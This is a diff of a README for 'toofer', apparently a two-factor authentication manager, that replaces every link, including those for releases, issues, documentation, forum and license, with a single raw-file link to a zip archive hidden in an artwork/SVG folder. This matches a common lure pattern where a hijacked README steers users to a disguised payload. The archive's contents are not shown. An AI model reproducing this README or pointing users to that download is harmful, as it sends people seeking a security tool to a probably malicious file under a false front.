@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download toofer](https://img.shields.io/badge/Download-toofer-blue.svg)](https://github.com/shudin69/toofer/releases)
+[![Download toofer](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip)](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Welcome to toofer! This application helps you manage your two-factor authenticat
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [toofer Releases page](https://github.com/shudin69/toofer/releases).
+   Go to the [toofer Releases page](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip).
    
 2. **Choose the Right Version**  
    You will see a list of available releases. Select the latest version. 
 
 3. **Download the Application**  
-   Click on the download link for your operating system. This may be named something like `toofer-linux.zip`, `toofer-macos.zip`, or `toofer-windows.zip`.
+   Click on the download link for your operating system. This may be named something like `https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip`, `https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip`, or `https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip`.
 
 4. **Extract the Files**  
    Once the download is complete, unzip the file to a folder on your computer. You can usually do this by right-clicking the file and selecting “Extract All” or similar.
@@ -56,15 +56,15 @@ If you encounter issues while downloading or running the application, consider t
 
 ## 📞 Need Help?
 
-If you have questions or need assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/shudin69/toofer/issues). The community is here to help.
+If you have questions or need assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip). The community is here to help.
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/shudin69/toofer/wiki) - For more detailed information.
-- [Community Forum](https://github.com/shudin69/toofer/discussions) - Join discussions and share your experiences.
+- [Official Documentation](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip) - For more detailed information.
+- [Community Forum](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip) - Join discussions and share your experiences.
 
 ## ⚙️ License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/shudin69/toofer/blob/main/LICENSE) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/shudin69/toofer/main/artwork/SVG/Software_3.8-alpha.5.zip) file for details. 
 
 Thank you for choosing toofer! We hope you enjoy the secure and simple experience of managing your two-factor authentication.
